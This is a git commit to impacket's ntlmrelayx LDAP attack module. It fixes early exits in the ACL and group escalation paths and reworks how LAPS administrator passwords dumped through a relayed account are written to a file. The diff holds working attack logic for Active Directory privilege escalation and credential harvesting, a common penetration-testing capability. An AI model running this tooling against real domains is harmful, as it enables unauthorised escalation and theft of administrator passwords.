c0b4f0751408e42d0635312cc6d8a52054af190d
Adam Crosser <adam.crosser@praetorian.com>
2020-02-06 18:10:30 -0600

    Updated Debug Messages and Fixed Early Exit Issue

--- impacket/examples/ntlmrelayx/attacks/ldapattack.py
+++ impacket/examples/ntlmrelayx/attacks/ldapattack.py
@@ -533,21 +533,19 @@ class LDAPAttack(ProtocolAttack):
                 result = self.getUserInfo(domainDumper, self.config.escalateuser)
                 # Unless that account does not exist of course
                 if not result:
-                    LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
-                userDn, userSid = result
-                # Perform the ACL attack
-                self.aclAttack(userDn, domainDumper)
-                return
+                    LOG.error('Unable to escalate without a valid user.')
+                else:
+                    userDn, userSid = result
+                    # Perform the ACL attack
+                    self.aclAttack(userDn, domainDumper)
             elif privs['create']:
                 # Create a nice shiny new user for the escalation
                 userDn = self.addUser(privs['createIn'], domainDumper)
                 if not userDn:
-                    LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
+                    LOG.error('Unable to escalate without a valid user.')
                 # Perform the ACL attack
-                self.aclAttack(userDn, domainDumper)
-                return
+                else:
+                    self.aclAttack(userDn, domainDumper)
             else:
                 LOG.error('Cannot perform ACL escalation because we do not have create user '\
                     'privileges. Specify a user to assign privileges to with --escalate-user')
@@ -560,21 +558,21 @@ class LDAPAttack(ProtocolAttack):
                 result = self.getUserInfo(domainDumper, self.config.escalateuser)
                 # Unless that account does not exist of course
                 if not result:
-                    LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
-                userDn, userSid = result
+                    LOG.error('Unable to escalate without a valid user.')
                 # Perform the Group attack
-                self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
-                return
+                else:
+                    userDn, userSid = result
+                    self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
+
             elif privs['create']:
                 # Create a nice shiny new user for the escalation
                 userDn = self.addUser(privs['createIn'], domainDumper)
                 if not userDn:
                     LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
                 # Perform the Group attack
-                self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
-                return
+                else:
+                    self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
+
             else:
                 LOG.error('Cannot perform ACL escalation because we do not have create user '\
                           'privileges. Specify a user to assign privileges to with --escalate-user')
@@ -587,27 +585,36 @@ class LDAPAttack(ProtocolAttack):
             
             if success:
 
-                filename = "laps-dump-" + self.username
-                with open(filename, "a+") as fd:
+                fd = None
+                filename = "laps-dump-" + self.username + "-" + str(random.randint(0, 99999))
+                count = 0
 
-                    for entry in self.client.response:
-                        try:
+                for entry in self.client.response:
+                    try:
+                        dn = "DN:" + entry['attributes']['distinguishedname']
+                        passwd = "Password:" + entry['attributes']['ms-MCS-AdmPwd']
 
-                            dn = "DN:" + entry['attributes']['distinguishedname']
-                            passwd = "Password:" + entry['attributes']['ms-MCS-AdmPwd']
+                        if fd is None:
+                            fd = open(filename, "a+")
 
-                            LOG.debug(dn)
-                            LOG.debug(passwd)
+                        count += 1
 
-                            fd.write(dn)
-                            fd.write("\n")
-                            fd.write(passwd)
-                            fd.write("\n")
-                        except:
-                            continue
+                        LOG.debug(dn)
+                        LOG.debug(passwd)
 
-                if os.stat(filename).st_size == 0:
-                    os.remove(filename)
+                        fd.write(dn)
+                        fd.write("\n")
+                        fd.write(passwd)
+                        fd.write("\n")
+
+                    except:
+                        continue
+
+                if fd is None:
+                    LOG.info("The relayed user %s does not have permissions to read any LAPS passwords" % self.username)
+                else:
+                    LOG.info("Successfully dumped %d LAPS passwords through relayed account %s" % (count, self.username))
+                    fd.close()
 
         # Perform the Delegate attack if it is enabled and we relayed a computer account
         if self.config.delegateaccess and self.username[-1] == '$':
